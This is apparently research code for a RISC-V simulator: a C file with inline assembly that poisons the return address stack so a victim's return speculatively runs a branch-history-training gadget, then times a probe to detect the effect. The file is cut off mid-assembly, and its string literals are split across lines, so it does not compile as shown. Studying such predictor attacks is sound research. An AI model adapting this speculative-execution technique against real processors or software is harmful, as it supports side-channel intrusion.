#include <stdint.h>
#include <stdio.h>

#define RAS_SIZE 32
#define GHR_TRAINING_BRANCHES 32 // Number of branches in the fingerprinting gadget
#define PROBE_BRANCHES 50       // Number of branches in the probe sequence
#define NUM_ATTACK_TRIALS 20

// Stack for M-mode
uint64_t _stack[512];
uint64_t *const _stack_top = _stack + 512;

// Tohost for simulation termination
extern volatile uint64_t tohost;

// Global variables for raw results
uint64_t results_victim_ret[NUM_ATTACK_TRIALS];
uint64_t results_victim_jumps[NUM_ATTACK_TRIALS];
uint64_t results_positive_taken[NUM_ATTACK_TRIALS];
uint64_t results_positive_not_taken[NUM_ATTACK_TRIALS];

// Trap handler (mandatory for bare-metal RISC-V)
__attribute__((naked))
void trap_handler() {
    asm volatile(
        "csrrw sp, mscratch, sp
" // Swap sp with mscratch (M-mode stack)
        // In this simple setup, we just terminate the simulation on trap.
        "addi t0, x0, 1
"
        "sd t0, tohost, x0
" // tohost = 1
        "1: j 1b
" // Infinite loop to terminate simulation
        // Restore sp from mscratch (if needed for actual return from trap)
        "csrrw sp, mscratch, sp
"
        "mret
" // Return from trap
    );
}

// Set up trap handler
void setup_trap_handler() {
    asm volatile("csrw mtvec, %0" :: "r"((uint64_t)trap_handler));
}

// Function to reset/normalize GHR state by executing a fixed sequence of branches.
// This is a heuristic to reduce noise between trials.
__attribute__((noinline))
void reset_ghr_state() {
    volatile int dummy_cond = 0; // Value for conditional branch
    for (int i = 0; i < GHR_TRAINING_BRANCHES * 2; i++) { // Execute enough branches to "clear" GHR
        if (dummy_cond % 2 == 0) { // Alternating taken/not-taken pattern
            dummy_cond++;
        } else {
            dummy_cond--;
        }
        // A conditional branch that influences GHR state
        asm volatile("bnez %0, 1f; 1: nop; " : : "r"(dummy_cond));
    }
}

// Probe sequence: uses conditional branches, whose prediction depends on GHR state.
// Measures time taken to execute PROBE_BRANCHES always-taken conditional branches.
// If GHR is trained for 'taken' by the gadget, these should be faster.
__attribute__((noinline))
uint64_t probe_sequence() {
    uint64_t start_cycles, end_cycles;
    volatile int x = 1; // Condition always true, but volatile to prevent optimization

    asm volatile ("rdcycle %0" : "=r" (start_cycles));

    for (int i = 0; i < PROBE_BRANCHES; i++) {
        asm volatile (
            "  bnez %0, 1f
" // Branch always taken, relies on GHR prediction
            "  nop; nop; nop; nop;
" // Filler for misprediction penalty
            "1: nop; nop; nop; nop;
" // Filler for correct prediction path
            : : "r"(x)
        );
    }

    asm volatile ("rdcycle %0" : "=r" (end_cycles));
    return end_cycles - start_cycles;
}

// Victim function that executes a 'ret' instruction.
// This 'ret' is the one whose prediction we want to influence.
__attribute__((noinline))
void victim_returns() {
    asm volatile("nop; nop; nop; nop; ret;");
}

// Victim function that does not execute a 'ret' at the critical point, but jumps instead.
__attribute__((noinline))
void victim_jumps() {
    // Uses 'jal x0, label' as an unconditional jump, which does not interact with RAS for return addresses.
    asm volatile("nop; nop; nop; nop; jal x0, 1f; 1: nop;");
}

// Positive Control function to measure a branch that is always taken.
__attribute__((noinline))
uint64_t measure_always_taken_branch() {
    uint64_t start_cycles, end_cycles;
    volatile int x = 1; // Condition always true

    // Train the branch to be taken
    for (int i = 0; i < 200; i++) { // Train for 200 iterations
        if (x) {
            asm volatile("nop;");
        } else {
            asm volatile("nop;");
        }
    }
    asm volatile ("rdcycle %0" : "=r" (start_cycles));
    for (int i = 0; i < 50; i++) { // Measure for 50 iterations
        if (x) {
            asm volatile("nop; nop; nop; nop;"); // Path taken
        } else {
            asm volatile("nop; nop; nop; nop;"); // Path not taken
        }
    }
    asm volatile ("rdcycle %0" : "=r" (end_cycles));
    return end_cycles - start_cycles;
}

// Positive Control function to measure a branch that is always not-taken.
__attribute__((noinline))
uint64_t measure_always_not_taken_branch() {
    uint64_t start_cycles, end_cycles;
    volatile int x = 0; // Condition always false

    // Train the branch to be not-taken
    for (int i = 0; i < 200; i++) { // Train for 200 iterations
        if (x) {
            asm volatile("nop;");
        } else {
            asm volatile("nop;");
        }
    }
    asm volatile ("rdcycle %0" : "=r" (start_cycles));
    for (int i = 0; i < 50; i++) { // Measure for 50 iterations
        if (x) {
            asm volatile("nop; nop; nop; nop;"); // Path taken
        } else {
            asm volatile("nop; nop; nop; nop;"); // Path not taken
        }
    }
    asm volatile ("rdcycle %0" : "=r" (end_cycles));
    return end_cycles - start_cycles;
}


void main() {
    // Setup stack pointer and call main
    asm volatile("mv sp, %0" :: "r"(_stack_top));

    setup_trap_handler();

    printf("RAS-GHR Cross-Predictor Attack Experiment
");
    printf("---------------------------------------
");

    // Positive Control: Measure well-predicted vs mispredicted branches
    printf("Positive Control (20 trials each):
");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        results_positive_taken[i] = measure_always_taken_branch();
        results_positive_not_taken[i] = measure_always_not_taken_branch();
    }

    printf("Positive Taken Times: ");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        printf("%lu ", results_positive_taken[i]);
    }
    printf("
");

    printf("Positive Not Taken Times: ");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        printf("%lu ", results_positive_not_taken[i]);
    }
    printf("

");

    // Attack Scenario
    printf("Attack Scenario (20 trials each):
");
    for (int i = 0; i < NUM_ATTACK_TRIALS; i++) {
        // Scenario 1: Victim executes 'ret', causing RAS misprediction to gadget
        reset_ghr_state(); // Normalize GHR before poisoning

        // Attacker's RAS poisoning. This block puts the address of
        // `fingerprinting_gadget_label_1` onto the RAS and then architecturally
        // jumps over the gadget to `skip_gadget_architecturally_1`.
        asm volatile (
            // Fill RAS with (RAS_SIZE - 1) dummy entries. Each `jal` pushes its `pc+4` to RAS.
            "  .balign 4
" // Align to instruction boundary
            "  .rept %0
" // Repeat RAS_SIZE - 1 times
            "    jal ra, 1f; 1: nop;
"
            "  .endr
"
            // Now, the last `jal` will push the gadget's entry point to RAS.
            // This `jal` also architecturally jumps to `skip_gadget_architecturally_1`.
            "  jal ra, skip_gadget_architecturally_1
" // Pushes address of `fingerprinting_gadget_label_1` onto RAS
            "fingerprinting_gadget_label_1:
"          // This label marks the entry point of the gadget
            "  nop; nop; nop; nop;
"                   // Gadget body starts
            // Series of unconditional jumps to train GHR with 'taken' branches
            "  jal x0, 2f
"
            "2: jal x0, 3f
"
            "3: jal x0, 4f
"
            "4: jal x0, 5f
"
            "5: jal x0, 6f
"
            "6: jal x0, 7f
"
            "7: jal x0, 8f
"
            "8: jal x0, 9f
"
            "9: jal x0, 10f
"
            "10: jal x0, 11f
"
            "11: jal x0, 12f
"
            "12: jal x0, 13f
"
            "13: jal x0, 14f
"
            "14: jal x0, 15f
"
            "15: jal x0, 16f
"
            "16: jal x0, 17f
"
            "17: jal x0, 18f
"
            "18: jal x0, 19f
"
            "19: jal x0, 20f
"
            "20: jal x0, 21f
"
            "21: jal x0, 22f
"
            "22: jal x0, 23f
"
            "23: jal x0, 24f
"
            "24: jal x0, 25f
"
            "25: jal x0, 26f
"
            "26: jal x0, 27f
"
            "27: jal x0, 28f
"
            "28: jal x0, 29f
"
            "29: jal x0, 30f
"
            "30: jal x0, 31f
"
            "31: ret
" // Speculative return for the gadget
            "skip_gadget_architecturally_1:
" // Architectural execution continues here
            : : "i"(RAS_SIZE - 1)
        );
        victim_returns(); // This `ret` will mispredict to `fingerprinting_gadget_label_1`
        results_victim_ret[i] = probe_sequence();

        // Scenario 2: Victim does not execute 'ret' at the critical point
        reset_ghr_state(); // Normalize GHR again

        // Same RAS poisoning as above, but with unique labels
        asm volatile (
            "  .balign 4
"
            "  .rept %0
"
            "    jal ra, 1f; 1: nop;
"
            "  .endr
"
            "  jal ra, skip_gadget_architecturally_2
" // Pushes address of `fingerprinting_gadget_label_2` onto RAS
            "fingerprinting_gadget_label_2:
"          // This label marks the entry point of the gadget
            "  nop; nop; nop; nop;
"                   // Gadget body starts
            // Series of unconditional jumps to train GHR with 'taken' branches
            "  jal x0, 2f
"
            "2: jal x0, 3f
"
            "3: jal x0, 4f
"
            "4: jal x0, 5f
"
            "5: jal x0, 6f
"
            "6: jal x0, 7f
"
            "7: jal x0, 8f
"
            "8: jal x0, 9f
"
            "9: jal x0, 10f
"
            "10: jal x0, 11f
"
